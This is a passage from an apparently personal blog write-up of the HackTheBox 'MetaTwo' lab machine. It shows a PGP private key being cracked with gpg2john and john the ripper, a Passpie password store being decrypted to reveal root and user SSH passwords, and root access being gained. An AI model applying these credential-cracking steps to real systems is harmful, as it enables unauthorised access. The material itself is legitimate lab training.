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
+=7Uo6
+-----END PGP PRIVATE KEY BLOCK-----
+</code></pre>
+<p>With this we can use <strong>gpg2john</strong> in order to crack it.</p>
+<pre><code class="bash">┌──(kali㉿kali)-[~/Desktop/HackTheBox/metatwo]
+└─$ sudo gpg2john key.key &gt; hash
+
+File key.key
+
+┌──(kali㉿kali)-[~/Desktop/HackTheBox/metatwo]
+└─$ cat hash 
+Passpie:$gpg$*17*54*3072*e975911867862609115f302a3d0196aec0c2ebf79a84c0303056df921c965e589f82d7dd71099ed9749408d5ad17a4421006d89b49c0*3*254*2*7*16*21d36a3443b38bad35df0f0e2c77f6b9*65011712*907cb55ccb37aaad:::Passpie (Auto-generated by Passpie) &lt;passpie@local&gt;::key.key
+</code></pre>
+<p>Now we can crack it using <strong>john the ripper</strong>:</p>
+<pre><code class="bash">└─$ sudo john hash --wordlist=/opt/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+Cost 1 (s2k-count) is 65011712 for all loaded hashes
+Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
+Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
+Will run 4 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+blink182         (Passpie)     
+</code></pre>
+<p>Now that we have the password we can try to export the <strong>new.pass</strong><br><strong>new.pass</strong>:</p>
+<pre><code class="bash">jnelson@meta2:/dev/shm$ cat new.pass 
+-----BEGIN PGP MESSAGE-----
+hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2
+nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km
+yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED
+/2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf
+iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg
+krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw
+mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr
+lpF0RatbxQGWBks5F3o=
+=uh1B
+-----END PGP MESSAGE-----
+</code></pre>
+<p>After exporting we can see the message:</p>
+<pre><code class="bash">jnelson@meta2:/dev/shm$ cat new.pass 
+credentials:
+- comment: &#39;&#39;
+  fullname: root@ssh
+  login: root
+  modified: 2022-06-26 08:58:15.621572
+  name: ssh
+  password: !!python/unicode &#39;p7qfAZt4_A1xo_0x&#39;
+- comment: &#39;&#39;
+  fullname: jnelson@ssh
+  login: jnelson
+  modified: 2022-06-26 08:58:15.514422
+  name: ssh
+  password: !!python/unicode &#39;Cb4_JmWM8zUZWMu@Ys&#39;
+handler: passpie
+version: 1.0
+</code></pre>
+<p>With that we can log in as <strong>root</strong> and extract the <strong>root.txt</strong></p>
+<pre><code class="bash">jnelson@meta2:/dev/shm$ su - root
+Password: 
+root@meta2:~# cat root.txt 
+5c558dbc463a6f0ae9304a9829f5944a
+root@meta2:~#
+</code></pre>
+</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2022/12/08/previse/" title="Previse"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: Previse</span></a><a class="button is-default" href="/2022/10/25/shared/" title="Shared"><span class="has-text-weight-semibold">Next: Shared</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="Haojen/Claudia-theme-blog" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com/IulianSiPunct"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/ischyr"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><a title="linkedin" target="_blank" rel="noopener nofollow" href="//www.linkedin.com/in/iulian-schifirnet-238049201"><i class="iconfont icon-linkedin"></i></a><!-- 脸书--></section><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Copyright © &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="IulianSiPunct" target="_blank" rel="noopener" href="//github.com/Furnicarul">ischyrós&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/Furnicarul" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/post.js"></script></body></html>
